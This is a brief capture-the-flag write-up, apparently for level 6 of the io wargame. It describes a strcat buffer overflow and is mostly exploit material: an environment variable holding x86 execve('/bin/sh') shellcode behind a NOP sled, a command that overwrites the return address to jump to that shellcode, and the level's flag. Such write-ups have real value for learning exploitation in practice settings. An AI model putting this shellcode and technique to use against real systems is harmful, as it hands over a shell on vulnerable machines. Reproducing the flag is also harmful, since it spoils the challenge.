strcat vulnerability. No null termination. Buffer overflow after that.

As before, exported shell code using:

```
export SHELLCODE=`python -c 'print "\x90"x50,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
```

Next found the address of this exported shellcode to be: `0xbfffff42`.

```
level6@io:/levels$ ./level06 "$(python -c 'print "A"*40 ')" "$(python -c 'print "\x90"*26 + "\x42\xff\xff\xbf"')"
```

Flag: `Nsr869Iyc0sFCX7I`